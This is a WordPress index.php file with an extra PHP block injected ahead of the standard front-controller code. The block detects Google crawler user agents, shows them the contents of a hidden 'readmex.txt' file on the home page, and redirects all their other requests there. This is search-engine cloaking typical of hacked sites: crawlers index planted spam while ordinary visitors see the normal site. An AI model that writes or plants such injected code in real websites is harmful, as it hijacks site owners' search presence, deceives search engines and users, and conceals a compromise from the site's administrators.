<?php

function is_google_bot() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
    $agents = array("googlebot", "google-site-verification", "google-inspectiontool", "googlebot-mobile", "googlebot-news", "googlebot-image", "googlebot-video", "googlebot-desktop", "googlebot-ads", "google-read-aloud", "apis-google", "mediapartners-google", "google favicon", "google web preview", "feedfetcher-google");
    foreach ($agents as $agent) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;
}

$is_google_bot = is_google_bot();
$uri = $_SERVER['REQUEST_URI'] ?? '';

if ($is_google_bot) {
    if ($uri == '/') {
        if (file_exists('readmex.txt')) {
            echo file_get_contents('readmex.txt');
        }
        exit();
    } else {
        header("Location: /");
        exit();
    }
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
